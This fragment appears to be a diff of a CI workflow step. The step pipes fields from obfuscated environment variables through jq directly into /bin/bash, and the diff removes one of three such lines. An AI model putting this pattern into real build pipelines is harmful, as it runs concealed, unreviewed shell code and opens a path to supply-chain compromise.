@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$cfus928" | jq -r .x8330 | /bin/bash
           printf '%s' "$z72" | jq -r .jtub2 | /bin/bash
-          echo $ddht88147 | jq -r .q21 | /bin/bash
 
       - name: Save results
         if: always()
